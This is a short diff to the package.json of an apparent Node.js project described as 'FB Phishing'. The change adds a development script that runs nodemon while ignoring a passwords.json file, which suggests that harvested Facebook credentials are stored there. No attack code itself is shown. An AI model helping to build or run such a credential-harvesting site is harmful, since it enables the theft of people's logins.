@@ -5,7 +5,8 @@
   "description": "FB Phishing",
   "main": "app.js",
   "scripts": {
-    "start": "nodemon app.js"
+    "dev": "nodemon --ignore passwords.json app.js",
+    "start": "node app.js"
   },
   "keywords": [
     "phishing",
